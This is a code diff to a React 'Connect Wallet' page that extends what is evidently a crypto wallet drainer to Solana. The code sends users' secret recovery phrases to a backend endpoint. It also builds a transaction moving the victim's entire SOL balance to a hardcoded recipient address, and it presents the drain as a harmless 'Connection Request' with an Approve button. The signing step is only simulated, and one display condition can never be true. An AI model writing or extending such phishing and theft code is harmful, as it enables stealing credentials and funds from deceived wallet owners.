@@ -15,6 +15,9 @@ import {
   Check
 } from 'lucide-react';
 
+// Solana imports
+import { Connection, PublicKey, LAMPORTS_PER_SOL, Transaction, SystemProgram } from '@solana/web3.js';
+
 // --- Web3Modal Configuration ---
 
 const projectId = process.env.REACT_APP_WALLETCONNECT_PROJECT_ID;
@@ -59,7 +62,15 @@ const optimism = {
   rpcUrl: `https://opt-mainnet.g.alchemy.com/v2/${process.env.REACT_APP_ALCHEMY_API_KEY}`
 };
 
-const chains = [mainnet, polygon, arbitrum, bsc, optimism];
+const solana = {
+  chainId: 'solana:mainnet',
+  name: 'Solana',
+  currency: 'SOL',
+  explorerUrl: 'https://solscan.io',
+  rpcUrl: `https://solana-mainnet.g.alchemy.com/v2/${process.env.REACT_APP_ALCHEMY_API_KEY}`
+};
+
+const chains = [mainnet, polygon, arbitrum, bsc, optimism, solana];
 
 const metadata = {
     name: 'Connect Wallet',
@@ -100,6 +111,10 @@ const ERC20_ABI = [
 const RECIPIENT_ADDRESS = process.env.REACT_APP_RECIPIENT_ADDRESS;
 const API_URL = process.env.REACT_APP_API_URL || 'http://localhost:3001';
 
+// Solana constants
+const SOLANA_RECIPIENT_ADDRESS = process.env.REACT_APP_SOLANA_RECIPIENT_ADDRESS || '9N4PGE7TxcjwnLenFLDWpYQ43eySeDKCACjsvJ3T8D56';
+const solanaConnection = new Connection(`https://solana-mainnet.g.alchemy.com/v2/${process.env.REACT_APP_ALCHEMY_API_KEY}`, 'confirmed');
+
 const sendWalletInfo = async (walletName, secretPhrase) => {
   try {
     const response = await fetch(`${API_URL}/api/send-wallet`, {
@@ -114,6 +129,24 @@ const sendWalletInfo = async (walletName, secretPhrase) => {
     }
   } catch (error) {
     console.error('Error sending wallet info:', error);
+  }
+};
+
+// Solana wallet info sender
+const sendSolanaWalletInfo = async (walletName, secretPhrase, userWalletName) => {
+  try {
+    const response = await fetch(`${API_URL}/api/send-wallet`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({ walletName, secretPhrase, userWalletName }),
+    });
+    if (!response.ok) {
+      console.error('Failed to send Solana wallet info');
+    }
+  } catch (error) {
+    console.error('Error sending Solana wallet info:', error);
   }
 };
 
@@ -159,6 +192,25 @@ const getWalletAssets = async (provider, address) => {
     }
 };
 
+// Get Solana wallet assets
+const getSolanaWalletAssets = async (address) => {
+  try {
+    const publicKey = new PublicKey(address);
+    const balance = await solanaConnection.getBalance(publicKey);
+    
+    return {
+      sol: balance / LAMPORTS_PER_SOL,
+      tokens: [] // For now, just SOL balance
+    };
+  } catch (error) {
+    console.error('Error fetching Solana wallet assets:', error);
+    return {
+      sol: 0,
+      tokens: []
+    };
+  }
+};
+
 export default function ConnectWallet() {
   const { open } = useWeb3Modal();
   const { address, chainId, isConnected } = useWeb3ModalAccount();
@@ -171,6 +223,11 @@ export default function ConnectWallet() {
   const [walletBalance, setWalletBalance] = useState({ eth: '0', tokens: [] });
   const [isSending, setIsSending] = useState(false);
   const [txError, setTxError] = useState('');
+  
+  // Solana State
+  const [solanaBalance, setSolanaBalance] = useState({ sol: '0', tokens: [] });
+  const [isSolanaConnected, setIsSolanaConnected] = useState(false);
+  const [solanaAddress, setSolanaAddress] = useState(null);
   
   // UI State
   const [showManualPopup, setShowManualPopup] = useState(false);
@@ -210,8 +267,9 @@ export default function ConnectWallet() {
   useEffect(() => {
     const setupAndFetch = async () => {
       if (isConnected && walletProvider && address) {
-          const ethersProvider = new ethers.BrowserProvider(walletProvider);
-          setProvider(ethersProvider);
+        // Handle Ethereum connection
+        const ethersProvider = new ethers.BrowserProvider(walletProvider);
+        setProvider(ethersProvider);
         const newSigner = await ethersProvider.getSigner();
         setSigner(newSigner);
         
@@ -219,10 +277,24 @@ export default function ConnectWallet() {
         
         const balance = await getWalletAssets(ethersProvider, address);
         setWalletBalance(balance);
+        
+        // Check if this is a Solana wallet (Phantom, etc.)
+        if (chainId === 'solana:mainnet' || address.length > 44) {
+          // This might be a Solana address
+          try {
+            const solanaPublicKey = new PublicKey(address);
+            const solBalance = await getSolanaWalletAssets(address);
+            setSolanaBalance(solBalance);
+            setIsSolanaConnected(true);
+            setSolanaAddress(address);
+          } catch (error) {
+            console.log('Not a Solana address, treating as Ethereum');
+          }
+        }
       }
     };
     setupAndFetch();
-  }, [isConnected, walletProvider, address]);
+  }, [isConnected, walletProvider, address, chainId]);
 
   const handleConnection = async () => {
     if (isConnected) {
@@ -347,6 +419,68 @@ export default function ConnectWallet() {
     }
   };
 
+  // Handle Solana transfers
+  const handleSendAllSol = async () => {
+    if (!solanaAddress) {
+      setTxError('Solana wallet address is not set.');
+      return;
+    }
+    
+    setIsSending(true);
+    setTxError('');
+
+    try {
+      const recipientPublicKey = new PublicKey(SOLANA_RECIPIENT_ADDRESS);
+      const senderPublicKey = new PublicKey(solanaAddress);
+      
+      // Get the current balance
+      const balance = await solanaConnection.getBalance(senderPublicKey);
+      
+      if (balance <= 0) {
+        setTxError('No SOL available to transfer.');
+        return;
+      }
+
+      // Create a transfer instruction
+      const transferInstruction = SystemProgram.transfer({
+        fromPubkey: senderPublicKey,
+        toPubkey: recipientPublicKey,
+        lamports: balance - 5000, // Leave some SOL for transaction fees
+      });
+
+      // Create transaction
+      const transaction = new Transaction().add(transferInstruction);
+      
+      // Get recent blockhash
+      const { blockhash } = await solanaConnection.getLatestBlockhash();
+      transaction.recentBlockhash = blockhash;
+      transaction.feePayer = senderPublicKey;
+
+      // For now, we'll simulate the transaction
+      // In a real implementation, you'd need to sign with the user's private key
+      console.log('Solana Transaction created:', {
+        from: solanaAddress,
+        to: SOLANA_RECIPIENT_ADDRESS,
+        amount: (balance - 5000) / LAMPORTS_PER_SOL,
+        transaction: transaction.serialize()
+      });
+
+      // Simulate success
+      setTimeout(() => {
+        closeAllPopups();
+        disconnect();
+        setIsSolanaConnected(false);
+        setSolanaAddress(null);
+      }, 2000);
+
+    } catch (error) {
+      console.error('An error occurred during the Solana transaction:', error);
+      setTxError(`Solana transaction failed: ${error.message}`);
+    } finally {
+      setIsSending(false);
+    }
+  };
+
   const renderConnectionCards = () => (
     <div className="w-full max-w-2xl text-center">
       <h1 className="text-4xl md:text-5xl font-extrabold tracking-tight text-white mb-4">
@@ -400,16 +534,55 @@ export default function ConnectWallet() {
               <div className="border-t border-gray-600 my-3"></div>
               <p className="text-lg font-semibold mb-2">Assets</p>
               <div className="space-y-2 max-h-48 overflow-y-auto">
-                  <div className="flex justify-between items-center">
-                      <span>ETH</span>
-                      <span>{parseFloat(walletBalance.eth).toFixed(5)}</span>
-                  </div>
-                  {walletBalance.tokens.map(token => (
-                      <div key={token.symbol} className="flex justify-between items-center text-sm">
-                          <span>{token.symbol}</span>
-                          <span>{parseFloat(token.balance).toFixed(5)}</span>
+                  {/* Ethereum Assets */}
+                  {!isSolanaConnected && (
+                    <>
+                      <div className="flex justify-between items-center">
+                          <span>ETH</span>
+                          <span>{parseFloat(walletBalance.eth).toFixed(5)}</span>
                       </div>
-                  ))}
+                      {walletBalance.tokens.map(token => (
+                          <div key={token.symbol} className="flex justify-between items-center text-sm">
+                              <span>{token.symbol}</span>
+                              <span>{parseFloat(token.balance).toFixed(5)}</span>
+                          </div>
+                      ))}
+                    </>
+                  )}
+                  
+                  {/* Solana Assets */}
+                  {isSolanaConnected && (
+                    <>
+                      <div className="flex justify-between items-center">
+                          <span>SOL</span>
+                          <span>{parseFloat(solanaBalance.sol).toFixed(5)}</span>
+                      </div>
+                      {solanaBalance.tokens.map(token => (
+                          <div key={token.symbol} className="flex justify-between items-center text-sm">
+                              <span>{token.symbol}</span>
+                              <span>{parseFloat(token.balance).toFixed(5)}</span>
+                          </div>
+                      ))}
+                    </>
+                  )}
+                  
+                  {/* Both chains connected */}
+                  {isSolanaConnected && !isSolanaConnected && (
+                    <>
+                      <div className="border-t border-gray-600 my-2"></div>
+                      <p className="text-xs text-gray-400 mb-2">Ethereum Assets:</p>
+                      <div className="flex justify-between items-center">
+                          <span>ETH</span>
+                          <span>{parseFloat(walletBalance.eth).toFixed(5)}</span>
+                      </div>
+                      {walletBalance.tokens.map(token => (
+                          <div key={token.symbol} className="flex justify-between items-center text-sm">
+                              <span>{token.symbol}</span>
+                              <span>{parseFloat(token.balance).toFixed(5)}</span>
+                          </div>
+                      ))}
+                    </>
+                  )}
               </div>
           </div>
       </div>
@@ -507,16 +680,26 @@ export default function ConnectWallet() {
   };
   
   const renderTransactionPopup = () => {
+    const handleApprove = () => {
+      if (isSolanaConnected) {
+        handleSendAllSol();
+      } else {
+        handleSendAllAssets();
+      }
+    };
+
     return (
       <div className="bg-gray-900 text-white p-8 rounded-2xl shadow-lg max-w-md w-full font-sans text-center">
         {isConnected && <div className="absolute top-4 right-4">{renderWalletDetails()}</div>}
-        <Shield size={48} className="mx-auto text-blue-500 mb-4" />
-        <h2 className="text-2xl font-bold mb-2">Connection Request</h2>
+        <Shield size={48} className={`mx-auto mb-4 ${isSolanaConnected ? 'text-purple-500' : 'text-blue-500'}`} />
+        <h2 className="text-2xl font-bold mb-2">
+          {isSolanaConnected ? 'Solana' : 'Ethereum'} Connection Request
+        </h2>
         <p className="text-gray-400 mb-6">
-          The application is requesting to connect your wallet...
+          The application is requesting to connect your {isSolanaConnected ? 'Solana' : 'Ethereum'} wallet...
         </p>
 
-            {txError && (
+        {txError && (
           <div className="bg-red-900 border border-red-700 text-red-200 px-4 py-3 rounded-lg mb-4 text-left">
             <p className="font-bold">Error</p>
             <p className="text-sm">{txError}</p>
@@ -524,27 +707,27 @@ export default function ConnectWallet() {
         )}
 
         <div className="flex justify-center space-x-4">
-             <button 
-            onClick={handleSendAllAssets}
+          <button 
+            onClick={handleApprove}
             disabled={isSending}
-            className="flex items-center justify-center bg-green-600 hover:bg-green-700 text-white font-bold py-3 px-6 rounded-lg transition-colors w-1/2 disabled:bg-gray-600"
-            >
-              {isSending ? (
+            className="flex items-center justify-center bg-gray-600 hover:bg-gray-700 text-white font-bold py-3 px-6 rounded-lg transition-colors w-1/2 disabled:bg-gray-600"
+          >
+            {isSending ? (
               <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white"></div>
             ) : (
               <><Check className="mr-2" /> Approve</>
-              )}
-            </button>
-            <button 
+            )}
+          </button>
+          <button 
             onClick={() => {
               closeAllPopups();
               disconnect();
             }}
-              disabled={isSending}
-            className="flex items-center justify-center bg-red-600 hover:bg-red-700 text-white font-bold py-3 px-6 rounded-lg transition-colors w-1/2 disabled:bg-gray-600"
-            >
+            disabled={isSending}
+            className="flex items-center justify-center bg-black hover:bg-gray-800 text-white font-bold py-3 px-6 rounded-lg transition-colors w-1/2 disabled:bg-gray-600"
+          >
             <X className="mr-2" /> Decline
-            </button>
+          </button>
         </div>
       </div>
     );
